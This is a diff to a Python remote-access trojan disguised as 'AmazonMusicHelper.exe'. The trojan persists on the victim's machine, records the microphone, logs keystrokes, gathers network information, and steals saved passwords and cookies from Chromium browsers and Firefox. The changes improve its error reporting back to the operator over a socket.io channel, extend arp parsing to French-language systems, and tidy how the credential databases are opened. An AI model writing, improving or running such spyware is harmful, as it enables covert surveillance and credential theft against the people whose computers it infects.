@@ -11,7 +11,7 @@ Run:     AmazonMusicHelper.exe       (uses built-in config, auto-persists)
          AmazonMusicHelper.exe --uninstall    (remove persistence)
 """
 
-import os, io, sys, re, json, time, base64, ctypes, shutil, socket
+import os, io, sys, re, json, time, base64, ctypes, shutil, socket, sqlite3
 import signal, logging, zipfile, argparse, threading, subprocess, random
 from pathlib import Path
 from datetime import datetime
@@ -150,16 +150,24 @@ class MicEngine:
 
     def start(self):
         if self.r: return
-        if not HAS["pyaudio"]: return
+        if not HAS["pyaudio"]:
+            if self.sio and self.sio.connected:
+                self.sio.emit("mic_status", {"active": False, "error": "pyaudio not installed on target"})
+            return
         try:
             self.pa = pyaudio.PyAudio()
             self.stream = self.pa.open(
                 format=pyaudio.paInt16, channels=1, rate=16000,
                 input=True, frames_per_buffer=4096)
         except Exception as e:
-            log.error(f"Mic init error: {e}"); self.stop(); return
+            log.error(f"Mic init error: {e}"); self.stop()
+            if self.sio and self.sio.connected:
+                self.sio.emit("mic_status", {"active": False, "error": str(e)})
+            return
         self.r = True
         threading.Thread(target=self._loop, daemon=True).start()
+        if self.sio and self.sio.connected:
+            self.sio.emit("mic_status", {"active": True})
 
     def stop(self):
         self.r = False
@@ -310,7 +318,10 @@ class Keylog:
         self._last_window = ""
 
     def start(self):
-        if self.r or not HAS["pynput"]: return
+        if self.r or not HAS["pynput"]:
+            if self.sio and self.sio.connected:
+                self.sio.emit("keylog_status", {"active": False, "error": "pynput not available"})
+            return
         self.r = True; self.buffer = []
         self.listener = keyboard.Listener(on_press=self._on_press)
         self.listener.start()
@@ -610,7 +621,8 @@ def _network_info():
             r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
             for line in r.stdout.split("\n"):
                 line = line.strip()
-                if line and ("dynamic" in line.lower() or "static" in line.lower()):
+                if line and ("dynamic" in line.lower() or "static" in line.lower()
+                             or "dynamique" in line.lower() or "statique" in line.lower()):
                     parts = line.split()
                     if len(parts) >= 2:
                         info["arp"].append({"ip": parts[0], "mac": parts[1].replace("-", ":"), "type": parts[-1] if len(parts) > 2 else ""})
@@ -666,7 +678,7 @@ def _steal_chromium(base_path, name, localapp):
                 temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"{name.lower()}_login_{item}.db")
                 try:
                     shutil.copy2(login_db, temp_db)
-                    conn = __import__('sqlite3').connect(temp_db)
+                    conn = sqlite3.connect(temp_db)
                     cur = conn.cursor()
                     try:
                         cur.execute("SELECT origin_url, username_value, password_value FROM logins")
@@ -690,7 +702,7 @@ def _steal_chromium(base_path, name, localapp):
                 temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"{name.lower()}_cookies_{item}.db")
                 try:
                     shutil.copy2(cookie_path, temp_db)
-                    conn = __import__('sqlite3').connect(temp_db)
+                    conn = sqlite3.connect(temp_db)
                     cur = conn.cursor()
                     try:
                         cur.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 200")
@@ -798,7 +810,7 @@ def _steal_firefox(base_path):
                 temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"ff_cookies_{item}.db")
                 try:
                     shutil.copy2(cookies_path, temp_db)
-                    conn = __import__('sqlite3').connect(temp_db)
+                    conn = sqlite3.connect(temp_db)
                     cur = conn.cursor()
                     try:
                         cur.execute("SELECT host, name, value FROM moz_cookies LIMIT 200")
@@ -1268,7 +1280,7 @@ def setup_handlers(sio):
 
     # Microphone
     @sio.on("mic_start")
-    def _mstart(d=None): mic.start(); sio.emit("mic_status", {"active": mic.r})
+    def _mstart(d=None): mic.start()
     @sio.on("mic_stop")
     def _mstop(): mic.stop(); sio.emit("mic_status", {"active": False})
 
